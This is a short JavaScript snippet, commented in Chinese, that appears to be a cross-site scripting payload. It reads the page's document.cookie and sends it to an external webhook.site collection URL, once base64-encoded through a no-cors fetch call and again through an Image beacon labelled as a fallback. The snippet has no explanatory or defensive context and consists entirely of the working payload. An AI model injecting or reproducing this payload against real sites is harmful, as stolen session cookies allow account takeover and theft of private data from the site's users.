var webhook = "https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071?";
// 发送 Cookie
fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });
// 备用方案
new Image().src = webhook + "c=" + document.cookie;
